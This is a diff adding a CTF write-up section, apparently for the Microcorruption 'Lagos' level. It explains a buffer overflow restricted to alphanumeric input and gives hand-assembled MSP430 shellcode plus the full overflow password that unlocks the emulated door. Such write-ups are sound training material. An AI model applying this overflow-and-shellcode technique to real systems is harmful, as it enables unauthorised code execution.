@@ -16,6 +16,7 @@
 - [Algiers](#algiers)
 - [Vladivostok](#vladivostok)
 - [Bangalore](#bangalore)
+- [Lagos](#lagos)
 
 ## Introduction
 
@@ -955,3 +956,35 @@ call #0x10
 
 password = 324000ffb01210009090909090909090ba443f000000ee3f
 
+## Lagos
+
+
+This challenge is a lot easier than the previous ones. It is stall a buffer overflow like most of the challenges. The difference this time is that the password can only in alphanumeric. That means we are limited to the hex codes 30-39, 41-5a, and 61-7a. That is the only trick to this challenge, which is creating shell code by using only a small number of hex codes. We need to figure out how to make shell code that puts 0x7f on the stack then calls the INT function. Or we need to get 0xff into the register sr then call 0x10. If we first try the password "AAAABBBBDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ", we can see that we overwrite the conditional_unlock_door function, which is the next function the program calls. If you look at the current instruction on the first line of conditional_unlock_door, we have three "58"s. That means we can add our shell code after the first X and it will run at the start of the conditional_unlock_door function. 
+
+```asm
+
+Current Instruction
+5858 5859
+add.b 0x5958(r8), r8
+
+```
+
+The problem now is what do we run. Since we know by the manual the micro controller of the device is a MSP430. We can see what op codes are only in alphanumeric. Good thing someone else has compiled that for us [here](https://gist.github.com/rmmh/8515577). The next part is the long and fun part of finding what exactly we can make that will do what we want. To skip the fun details I will explain what my shell code does. Fist we add 0x7a7a to register r9. Then we subtract 0x346C from 0x7a7a to get 0x460e, which will be used later. Next we move register r6 into register sr to clear it. Then we add 0x5444 + 0x5566 + 0x5556 getting 0xff00. Exactly what we need in register sr to open the door. The last thing we need to do is call 0x10, which the next line sets up for us. Now we move 0x460e into the instruction pointer to point it to address that contains the 0x10 call. Assembling the shell code gets us "39507a7a39706c3442463250445432506655325056553049" or "9Pzz9pl4BF2PDT2PfU2PVU0I". We append that to the end of our original password but with everything after the first X removed, which is "AAAABBBBDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWX9Pzz9pl4BF2PDT2PfU2PVU0I". Entering that in solves the challenge.
+
+```asm
+
+add #0x7a7a, r9
+subc #0x346C,r9
+mov.b    r6, sr
+add      #0x5444, sr
+add      #0x5566, sr
+add      #0x5556, sr
+mov @r9+,pc
+
+39507a7a39706c3442463250445432506655325056553049
+```
+
+
+### Solved
+
+password = AAAABBBBDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWX9Pzz9pl4BF2PDT2PfU2PVU0I
